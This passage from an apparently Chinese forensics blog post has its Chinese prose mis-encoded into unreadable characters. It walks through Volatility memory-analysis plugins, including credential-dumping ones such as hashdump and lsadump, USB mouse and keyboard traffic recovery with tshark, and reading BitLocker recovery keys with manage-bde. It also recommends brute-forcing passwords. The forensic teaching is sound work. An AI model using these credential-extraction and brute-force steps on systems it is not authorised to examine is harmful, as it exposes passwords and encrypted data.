title=""></a></h6><p>hivelistï¼šç”¨äºå®šä½å†…å­˜ä¸­æ³¨å†Œè¡¨æ–‡ä»¶çš„è™šæ‹Ÿåœ°å€ä»¥åŠç›¸åº”æ–‡ä»¶åœ¨ç£ç›˜ä¸Šçš„å®Œæ•´è·¯å¾„</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-48.png" class="" title="2024-03-25_14-48.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><p>printkeyï¼šæå–æ³¨å†Œè¡¨é”®ä¸­çš„å­é”®ã€å€¼ã€æ•°æ®å’Œæ•°æ®ç±»å‹</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_14-50.png" class="" title="2024-03-25_14-50.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><p>æ€»ä¹‹ï¼ŒVolatilityå‘½ä»¤å‚æ•°å¾ˆå¤šï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œä¸å†ä¸€ä¸€æ¼”ç¤º</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Usage: Volatility - A memory forensics analysis platform.<br><br>Options:<br>  -h, --help            list all available options <span class="hljs-keyword">and</span> their<span class="hljs-built_in"> default </span>values.<br>                       <span class="hljs-built_in"> Default </span>values may be <span class="hljs-built_in">set</span> <span class="hljs-keyword">in</span> the configuration file<br>                        (/etc/volatilityrc)<br>  <span class="hljs-attribute">--conf-file</span>=/home/liuty/.volatilityrc<br>                       <span class="hljs-built_in"> User </span>based configuration file<br>  -d, --<span class="hljs-built_in">debug</span>           <span class="hljs-built_in">Debug</span> volatility<br>  <span class="hljs-attribute">--plugins</span>=PLUGINS     Additional plugin directories <span class="hljs-keyword">to</span> use (colon separated)<br>  --<span class="hljs-built_in">info</span>                <span class="hljs-built_in">Print</span> information about all registered objects<br>  <span class="hljs-attribute">--cache-directory</span>=/home/liuty/.cache/volatility<br>                        Directory where cache files are stored<br>  --cache               Use caching<br>  <span class="hljs-attribute">--tz</span>=TZ               Sets the (Olson) timezone <span class="hljs-keyword">for</span> displaying timestamps<br>                        using pytz (<span class="hljs-keyword">if</span> installed) <span class="hljs-keyword">or</span> tzset<br>  -f FILENAME, <span class="hljs-attribute">--filename</span>=FILENAME<br>                        Filename <span class="hljs-keyword">to</span> use when opening an image<br>  <span class="hljs-attribute">--profile</span>=WinXPSP2x86<br>                        Name of the<span class="hljs-built_in"> profile </span><span class="hljs-keyword">to</span> load (use --<span class="hljs-built_in">info</span> <span class="hljs-keyword">to</span> see a list<br>                        of supported profiles)<br>  -l LOCATION, <span class="hljs-attribute">--location</span>=LOCATION<br>                        A URN location <span class="hljs-keyword">from</span> which <span class="hljs-keyword">to</span> load an<span class="hljs-built_in"> address </span>space<br>  -w, --write           <span class="hljs-built_in">Enable</span> write support<br>  <span class="hljs-attribute">--dtb</span>=DTB             DTB<span class="hljs-built_in"> Address</span><br><span class="hljs-built_in"></span>  <span class="hljs-attribute">--shift</span>=SHIFT         Mac KASLR shift<span class="hljs-built_in"> address</span><br><span class="hljs-built_in"></span>  <span class="hljs-attribute">--output</span>=text         Output <span class="hljs-keyword">in</span> this format (support is module specific, see<br>                        the Module Output Options below)<br>  <span class="hljs-attribute">--output-file</span>=OUTPUT_FILE<br>                        Write output <span class="hljs-keyword">in</span> this file<br>  -v, --verbose         Verbose information<br>  <span class="hljs-attribute">--physical_shift</span>=PHYSICAL_SHIFT<br>                        Linux kernel physical shift<span class="hljs-built_in"> address</span><br><span class="hljs-built_in"></span>  <span class="hljs-attribute">--virtual_shift</span>=VIRTUAL_SHIFT<br>                        Linux kernel virtual shift<span class="hljs-built_in"> address</span><br><span class="hljs-built_in"></span>  -g KDBG, <span class="hljs-attribute">--kdbg</span>=KDBG  Specify a KDBG virtual<span class="hljs-built_in"> address </span>(Note: <span class="hljs-keyword">for</span> 64-bit<br>                        Windows 8 <span class="hljs-keyword">and</span> above this is the<span class="hljs-built_in"> address </span>of<br>                        KdCopyDataBlock)<br>  --force               Force utilization of suspect<span class="hljs-built_in"> profile</span><br><span class="hljs-built_in"></span>  <span class="hljs-attribute">--cookie</span>=COOKIE       Specify the<span class="hljs-built_in"> address </span>of nt!ObHeaderCookie (valid <span class="hljs-keyword">for</span><br>                        Windows 10 only)<br>  -k KPCR, <span class="hljs-attribute">--kpcr</span>=KPCR  Specify a specific KPCR<span class="hljs-built_in"> address</span><br><span class="hljs-built_in"></span><br>        Supported Plugin Commands:<br><br>                amcache         <span class="hljs-built_in">Print</span> AmCache information<br>                apihooks        Detect API hooks <span class="hljs-keyword">in</span> process <span class="hljs-keyword">and</span> kernel memory<br>                atoms           <span class="hljs-built_in">Print</span> session <span class="hljs-keyword">and</span> window station atom tables<br>                atomscan       <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> atom tables<br>                auditpol        Prints out the Audit Policies <span class="hljs-keyword">from</span> HKLM\SECURITY\Policy\PolAdtEv<br>                bigpools        Dump the big<span class="hljs-built_in"> page </span>pools using BigPagePoolScanner<br>                bioskbd         Reads the keyboard buffer <span class="hljs-keyword">from</span> Real Mode memory<br>                cachedump       Dumps cached domain hashes <span class="hljs-keyword">from</span> memory<br>                callbacks       <span class="hljs-built_in">Print</span> system-wide notification routines<br>                clipboard       Extract the contents of the windows clipboard<br>                cmdline         Display process command-line arguments<br>                cmdscan         Extract command history by scanning <span class="hljs-keyword">for</span> _COMMAND_HISTORY<br>                connections     <span class="hljs-built_in">Print</span> list of open connections [Windows XP <span class="hljs-keyword">and</span> 2003 Only]<br>                connscan       <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> tcp connections<br>                consoles        Extract command history by scanning <span class="hljs-keyword">for</span> _CONSOLE_INFORMATION<br>                crashinfo       Dump crash-dump information<br>                deskscan        Poolscaner <span class="hljs-keyword">for</span> tagDESKTOP (desktops)<br>                devicetree      Show device tree<br>                dlldump         Dump DLLs <span class="hljs-keyword">from</span> a process<span class="hljs-built_in"> address </span>space<br>                dlllist         <span class="hljs-built_in">Print</span> list of loaded dlls <span class="hljs-keyword">for</span> each process<br>                driverirp       Driver IRP hook detection<br>                drivermodule    Associate driver objects <span class="hljs-keyword">to</span> kernel modules<br>                driverscan     <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> driver objects<br>                dumpcerts       Dump RSA private <span class="hljs-keyword">and</span> public SSL keys<br>                dumpfiles       Extract memory mapped <span class="hljs-keyword">and</span> cached files<br>                dumpregistry    Dumps registry files out <span class="hljs-keyword">to</span> disk<br>                editbox         Displays information about <span class="hljs-built_in">Edit</span> controls. (Listbox experimental.)<br>                envars          Display process environment variables<br>                eventhooks      <span class="hljs-built_in">Print</span> details on windows event hooks<br>                evtlogs         Extract Windows Event Logs (XP/2003 only)<br>                filescan       <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> file objects<br>                gahti           Dump the<span class="hljs-built_in"> USER </span>handle<span class="hljs-built_in"> type </span>information<br>                gditimers       <span class="hljs-built_in">Print</span> installed GDI timers <span class="hljs-keyword">and</span> callbacks<br>                gdt             Display Global Descriptor Table<br>                getservicesids  <span class="hljs-built_in">Get</span> the names of services <span class="hljs-keyword">in</span> the Registry <span class="hljs-keyword">and</span> return Calculated SID<br>                getsids         <span class="hljs-built_in">Print</span> the SIDs owning each process<br>                handles         <span class="hljs-built_in">Print</span> list of open handles <span class="hljs-keyword">for</span> each process<br>                hashdump        Dumps passwords hashes (LM/NTLM) <span class="hljs-keyword">from</span> memory<br>                hibinfo         Dump hibernation file information<br>                hivedump        Prints out a hive<br>                hivelist        <span class="hljs-built_in">Print</span> list of registry hives.<br>                hivescan       <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> registry hives<br>                hpakextract     Extract physical memory <span class="hljs-keyword">from</span> an HPAK file<br>                hpakinfo        <span class="hljs-built_in">Info</span> on an HPAK file<br>                idt             Display Interrupt Descriptor Table<br>                iehistory       Reconstruct Internet Explorer cache / history<br>                imagecopy       Copies a physical<span class="hljs-built_in"> address </span>space out as a<span class="hljs-built_in"> raw </span>DD image<br>                imageinfo       Identify information <span class="hljs-keyword">for</span> the image<br>                impscan         Scan <span class="hljs-keyword">for</span> calls <span class="hljs-keyword">to</span> imported functions<br>                joblinks        <span class="hljs-built_in">Print</span> process job link information<br>                kdbgscan        Search <span class="hljs-keyword">for</span> <span class="hljs-keyword">and</span> dump potential KDBG values<br>                kpcrscan        Search <span class="hljs-keyword">for</span> <span class="hljs-keyword">and</span> dump potential KPCR values<br>                ldrmodules      Detect unlinked DLLs<br>                lsadump         Dump (decrypted) LSA secrets <span class="hljs-keyword">from</span> the registry<br>                machoinfo       Dump Mach-O file format information<br>                malfind         <span class="hljs-built_in">Find</span> hidden <span class="hljs-keyword">and</span> injected code<br>                mbrparser       Scans <span class="hljs-keyword">for</span> <span class="hljs-keyword">and</span> parses potential Master Boot Records (MBRs)<br>                memdump         Dump the addressable memory <span class="hljs-keyword">for</span> a process<br>                memmap          <span class="hljs-built_in">Print</span> the memory map<br>                messagehooks    List desktop <span class="hljs-keyword">and</span> thread window message hooks<br>                mftparser       Scans <span class="hljs-keyword">for</span> <span class="hljs-keyword">and</span> parses potential MFT entries<br>                moddump         Dump a kernel driver <span class="hljs-keyword">to</span> an executable file sample<br>                modscan        <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> kernel modules<br>                modules         <span class="hljs-built_in">Print</span> list of loaded modules<br>                multiscan       Scan <span class="hljs-keyword">for</span> various objects at once<br>                mutantscan     <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> mutex objects<br>                notepad         List currently displayed notepad text<br>                objtypescan     Scan <span class="hljs-keyword">for</span> Windows object<span class="hljs-built_in"> type </span>objects<br>                patcher         Patches memory based on<span class="hljs-built_in"> page </span>scans<br>                poolpeek        Configurable<span class="hljs-built_in"> pool </span>scanner plugin<br>                printkey        <span class="hljs-built_in">Print</span> a registry key, <span class="hljs-keyword">and</span> its subkeys <span class="hljs-keyword">and</span> values<br>                privs           Display process privileges<br>                procdump        Dump a process <span class="hljs-keyword">to</span> an executable file sample<br>                pslist          <span class="hljs-built_in">Print</span> all running processes by following the EPROCESS lists<br>                psscan         <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> process objects<br>                pstree          <span class="hljs-built_in">Print</span> process list as a tree<br>                psxview         <span class="hljs-built_in">Find</span> hidden processes with various process listings<br>                qemuinfo        Dump Qemu information<br>                raw2dmp         Converts a physical memory sample <span class="hljs-keyword">to</span> a windbg crash dump<br>                screenshot      Save a pseudo-screenshot based on GDI windows<br>                servicediff     List Windows services (ala Plugx)<br>                sessions        List details on _MM_SESSION_SPACE (user logon sessions)<br>                shellbags       Prints ShellBags <span class="hljs-built_in">info</span><br>                shimcache       Parses the Application Compatibility Shim Cache registry key<br>                shutdowntime    <span class="hljs-built_in">Print</span> ShutdownTime of machine <span class="hljs-keyword">from</span> registry<br>                sockets         <span class="hljs-built_in">Print</span> list of open sockets<br>                sockscan       <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> tcp socket objects<br>                ssdt            Display SSDT entries<br>                strings         Match physical offsets <span class="hljs-keyword">to</span> virtual addresses (may take a <span class="hljs-keyword">while</span>, VERY verbose)<br>                svcscan         Scan <span class="hljs-keyword">for</span> Windows services<br>                symlinkscan    <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> symlink objects<br>                thrdscan       <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> thread objects<br>                threads         Investigate _ETHREAD <span class="hljs-keyword">and</span> _KTHREADs<br>                timeliner       Creates a timeline <span class="hljs-keyword">from</span> various artifacts <span class="hljs-keyword">in</span> memory<br>                timers          <span class="hljs-built_in">Print</span> kernel timers <span class="hljs-keyword">and</span> associated module DPCs<br>                truecryptmaster Recover TrueCrypt 7.1a Master Keys<br>                truecryptpassphrase     TrueCrypt Cached Passphrase Finder<br>                truecryptsummary        TrueCrypt Summary<br>                unloadedmodules <span class="hljs-built_in">Print</span> list of unloaded modules<br>                userassist      <span class="hljs-built_in">Print</span> userassist registry keys <span class="hljs-keyword">and</span> information<br>                userhandles     Dump the<span class="hljs-built_in"> USER </span>handle tables<br>                vaddump         Dumps out the vad sections <span class="hljs-keyword">to</span> a file<br>                vadinfo         Dump the VAD <span class="hljs-built_in">info</span><br>                vadtree         Walk the VAD tree <span class="hljs-keyword">and</span> display <span class="hljs-keyword">in</span> tree format<br>                vadwalk         Walk the VAD tree<br>                vboxinfo        Dump virtualbox information<br>                verinfo         Prints out the version information <span class="hljs-keyword">from</span> PE images<br>                vmwareinfo      Dump VMware VMSS/VMSN information<br>                volshell        Shell <span class="hljs-keyword">in</span> the memory image<br>                windows         <span class="hljs-built_in">Print</span> Desktop Windows (verbose details)<br>                wintree         <span class="hljs-built_in">Print</span> Z-Order Desktop Windows Tree<br>                wndscan        <span class="hljs-built_in"> Pool </span>scanner <span class="hljs-keyword">for</span> window stations<br>                yarascan        Scan process <span class="hljs-keyword">or</span> kernel memory with Yara signatures<br></code></pre></td></tr></table></figure><h2 id="USBæµé‡æ•°æ®å–è¯"><a href="#USBæµé‡æ•°æ®å–è¯" class="headerlink" title="USBæµé‡æ•°æ®å–è¯"></a>USBæµé‡æ•°æ®å–è¯</h2><p>å…³äºé¼ æ ‡æµé‡å–è¯ï¼Œæ¯ä¸ªæ•°æ®åŒ…çš„æ•°æ®åŒºæœ‰å››ä¸ªå­—èŠ‚ã€‚ç¬¬ä¸€ä¸ªå­—èŠ‚ä»£è¡¨æŒ‰é’®ã€‚å–0x00æ—¶ï¼Œè¡¨ç¤ºæ²¡æœ‰æŒ‰é’®ã€‚ä¸º0x01æ—¶ï¼Œè¡¨ç¤ºå·¦é”®ï¼Œå½“å®ƒæ˜¯0x02æ—¶ï¼Œè¡¨ç¤ºå½“å‰æŒ‰é’®æ˜¯å³é”®ï¼Œç¬¬äºŒä¸ªå­—èŠ‚å¯ä»¥è¢«è®¤ä¸ºæ˜¯å¸¦ç¬¦å·çš„å­—èŠ‚ç±»å‹ï¼Œæœ€é«˜ä½æ˜¯ç¬¦å·ä½ï¼Œå½“è¯¥å€¼ä¸ºæ­£æ—¶ï¼Œè¡¨ç¤ºé¼ æ ‡æ°´å¹³å‘å³ç§»åŠ¨å¤šå°‘åƒç´ ï¼Œå½“å®ƒä¸ºè´Ÿæ•°æ—¶ï¼Œè¡¨ç¤ºå‘å·¦ç§»åŠ¨äº†å¤šå°‘åƒç´ ã€‚ç¬¬ä¸‰ä¸ªå­—èŠ‚ç±»ä¼¼äºç¬¬äºŒä¸ªå­—èŠ‚ï¼Œä»£è¡¨å‚ç›´å‘ä¸Šå’Œå‘ä¸‹ç§»åŠ¨çš„åç§»é‡ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹ä¸€ä¸ªæ•°æ®åŒ…</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_10-14.png" class="" title="2024-03-25_10-14.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>å¯ä»¥çœ‹åˆ°è®¤è¯ç­‰çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»é‡Œé¢çœ‹åˆ°è¿™ä¸ªè®¾å¤‡çš„ä¿¡æ¯ï¼Œåº”è¯¥æ˜¯ç½—æŠ€çš„é¼ æ ‡ï¼Œç„¶åæˆ‘ä»¬ç”¨tsharkå¯¹usbæ•°æ®è¿›è¡Œæå–</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tshark -r capture<span class="hljs-selector-class">.pcapng</span> -T fields -e usb<span class="hljs-selector-class">.capdata</span> &gt; data2.txt<br></code></pre></td></tr></table></figure><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_11-09.png" class="" title="2024-03-25_11-09.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>å¯ä»¥çœ‹åˆ°æ•°æ®æ˜¯å››ä¸ªå­—èŠ‚çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åŸºæœ¬å¯ä»¥åˆ¤æ–­æ˜¯usbé¼ æ ‡æµé‡ï¼Œç„¶åå°†ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå­—èŠ‚è½¬æ¢ä¸ºåæ ‡ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªåæ ‡æ–‡ä»¶</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_11-21.png" class="" title="2024-03-25_11-21.png"><h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_19-57.png" class="" title="2024-03-25_19-57.png"><h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><p>æœ€åå°†æ•°æ®ç»˜åˆ¶åˆ° Gnuplot ä¸­ï¼Œå°±å¯ä»¥å¤åŸé¼ æ ‡è¡ŒåŠ¨è½¨è¿¹</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_11-27.png" class="" title="2024-03-25_11-27.png"><h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><p>å½“ç„¶å¯¹äºé¼ æ ‡usbçš„å–è¯ä¹Ÿæœ‰ä¸€äº›è„šæœ¬å¯ä»¥ä½¿ç”¨ï¼Œæ¯”å¦‚ <a href="https://github.com/WangYihang/UsbMiceDataHacker">https://github.com/WangYihang/UsbMiceDataHacker</a></p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_10-54.png" class="" title="2024-03-25_10-54.png"><h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_19-42.png" class="" title="2024-03-25_19-42.png"><h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><p>å¯¹äºé”®ç›˜æµé‡å–è¯ï¼Œé”®ç›˜æ•°æ®åŒ…çš„æ•°æ®é•¿åº¦ä¸º8ä¸ªå­—èŠ‚ï¼Œå’Œå‡»é”®ä¿¡æ¯è¢«é›†ä¸­åœ¨ç¬¬ä¸‰ä¸ªå­—èŠ‚ï¼Œæ¯æ¬¡key strokeéƒ½ä¼šäº§ç”Ÿä¸€ä¸ªkeyboard event usb packet,é€šè¿‡ä¸‹é¢è¿™å¼ å›¾å¯ä»¥æ‰¾åˆ°è¿™ä¸ªå€¼ä¸å…·ä½“é”®ä½çš„å¯¹åº”å…³ç³»</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-25_11-00.png" class="" title="2024-03-25_11-00.png"><h6 id="-29"><a href="#-29" class="headerlink" title=""></a></h6><h2 id="windowsç³»ç»Ÿä¸‹BitlockeråŠ å¯†é—®é¢˜"><a href="#windowsç³»ç»Ÿä¸‹BitlockeråŠ å¯†é—®é¢˜" class="headerlink" title="windowsç³»ç»Ÿä¸‹BitlockeråŠ å¯†é—®é¢˜"></a>windowsç³»ç»Ÿä¸‹BitlockeråŠ å¯†é—®é¢˜</h2><p>Windowsä¸“ä¸šç‰ˆ&#x2F;ä¼ä¸šç‰ˆ&#x2F;æ•™è‚²ç‰ˆçš„æ“ä½œç³»ç»Ÿæ”¯æŒå¼€å¯å’Œä½¿ç”¨BitlockeråŠ å¯†ï¼Œè€Œå®¶åº­ç‰ˆä¸æ”¯æŒï¼Œä¸è¿‡å®¶åº­ç‰ˆå¯ä»¥é€šè¿‡â€è®¾å¤‡åŠ å¯†â€é‚£é‡Œå¯åŠ¨ç£ç›˜ä¿æŠ¤ï¼Œå¯åŠ¨Bitlockerçš„æ–¹å¼ä¸ºï¼šæ§åˆ¶é¢æ¿-&gt;Bitlockeré©±åŠ¨å™¨åŠ å¯†-&gt;å¯ç”¨Bitlocker</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-160737.png" class="" title="2024-03-24-160737.png"><h6 id="-30"><a href="#-30" class="headerlink" title=""></a></h6><p>å¯¹äºåŠ å¯†ï¼Œæœ‰ä¸‰ç§è§£é”æ–¹å¼å¯é€‰ï¼Œåˆ†åˆ«æ˜¯ä½¿ç”¨å¯†ç è§£é”ã€ä½¿ç”¨æ™ºèƒ½å¡è§£é”ä»¥åŠåœ¨æ­¤è®¡ç®—æœºä¸Šè‡ªåŠ¨è§£é”ï¼Œä¸è¿‡æœ‰äº›ç³»ç»Ÿç‰ˆæœ¬åªæ˜¾ç¤ºä¸¤ç§ï¼Œæ¯”å¦‚æˆ‘çš„</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-160838.png" class="" title="2024-03-24-160838.png"><h6 id="-31"><a href="#-31" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-160938.png" class="" title="2024-03-24-160938.png"><h6 id="-32"><a href="#-32" class="headerlink" title=""></a></h6><p>BitlockeråŠ å¯†åçš„è¡¨ç°ï¼Œä¼šæ˜¾ç¤ºæœ‰ä¸€æŠŠé”æ ‡å¿—</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-161223.png" class="" title="2024-03-24-161223.png"><h6 id="-33"><a href="#-33" class="headerlink" title=""></a></h6><p>å¦‚æœæƒ³æŸ¥å±äºå“ªç§åŠ å¯†ç±»å‹ï¼Œå¯é€šè¿‡manage-bdeç®¡ç†å·¥å…·æ¥æŸ¥çœ‹Bitlockerä¿æŠ¤ç±»å‹</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">manage-bde-<span class="hljs-keyword">status</span> x:<br></code></pre></td></tr></table></figure><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-161343.png" class="" title="2024-03-24-161343.png"><h6 id="-34"><a href="#-34" class="headerlink" title=""></a></h6><p>è¢«Bitlockerä¿æŠ¤çš„é©±åŠ¨å™¨ï¼Œå…¶DBRç‰¹å¾éå¸¸æ˜æ˜¾ï¼Œé€šè¿‡XWFæˆ–è€…winhexå¯æŸ¥çœ‹æ ‡å¿—å¤´ä½ï¼Œå…¸å‹ç‰¹å¾ï¼šâ€œFVE-FSâ€</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-170846.png" class="" title="2024-03-24-170846.png"><h6 id="-35"><a href="#-35" class="headerlink" title=""></a></h6><p>è€Œä¸åŒç£ç›˜çš„æ ‡å¿—å¤´ä½æ˜¯â€NTFSâ€</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-170907.png" class="" title="2024-03-24-170907.png"><h6 id="-36"><a href="#-36" class="headerlink" title=""></a></h6><p>å¯¹äºå¯ç”¨Bitlockerä¿æŠ¤çš„ç¡¬ç›˜åœ¨è¿›è¡Œè¯æ®å›ºå®šæ—¶ä¸å¯åšå…¨ç›˜é•œåƒï¼Œå› ä¸ºåšä¸‹æ¥çš„é•œåƒè¿˜æ˜¯åŠ å¯†çŠ¶æ€ï¼Œå¦‚æœä»¥ç‰©ç†é©±åŠ¨å™¨çš„æ–¹å¼å°†æ•´å—ç¡¬ç›˜æ·»åŠ åˆ°æ¡ˆä»¶ä¸­ï¼Œæ˜¯å¯ä»¥æ˜æ˜¾çœ‹åˆ°ç¡¬ç›˜å¤„äºBitlockeråŠ å¯†çŠ¶æ€</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-171406.png" class="" title="2024-03-24-171406.png"><h6 id="-37"><a href="#-37" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-171456.png" class="" title="2024-03-24-171456.png"><h6 id="-38"><a href="#-38" class="headerlink" title=""></a></h6><p>ä½†æ˜¯å¦‚æœä»¥æ·»åŠ é€»è¾‘é©±åŠ¨å™¨çš„å½¢å¼å°†åˆ†åŒºæ·»åŠ åˆ°æ¡ˆä»¶ä¸­ï¼Œæ˜¯å¯ä»¥è§£æå‡ºå®Œæ•´çš„åˆ†åŒºç»“æ„å’Œç›®å½•çš„ï¼Œæ‰€ä»¥åœ¨ä¸çŸ¥é“å¯†ç æˆ–è€…æ¢å¤å¯†é’¥çš„æƒ…å†µä¸‹ï¼Œæ˜¯æ— æ³•å¯¹ç¡¬ç›˜é•œåƒè¿›è¡Œè§£å¯†çš„</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-171820.png" class="" title="2024-03-24-171820.png"><h6 id="-39"><a href="#-39" class="headerlink" title=""></a></h6><p>é‚£æˆ‘ä»¬æ€ä¹ˆå¾—åˆ°æ¢å¤å¯†é’¥ï¼Ÿåœ¨ç³»ç»Ÿä¸‹å¯ç›´æ¥ä½¿ç”¨manage-bdeå°†åŠ å¯†å·çš„æ¢å¤å¯†é’¥è¯»å–å‡ºæ¥</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">manage-bde -protectors -<span class="hljs-built_in">get</span> x:<br></code></pre></td></tr></table></figure><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-172013.png" class="" title="2024-03-24-172013.png"><h6 id="-40"><a href="#-40" class="headerlink" title=""></a></h6><p>æœ‰æ—¶å€™ï¼Œå¸¸è§„æ‰‹æ®µä¸è¡Œé‚£å°±ä¸Šå¼ºåº¦ï¼Œçˆ†ç ´ï¼æ¨èPassware Kit Forensic</p><img 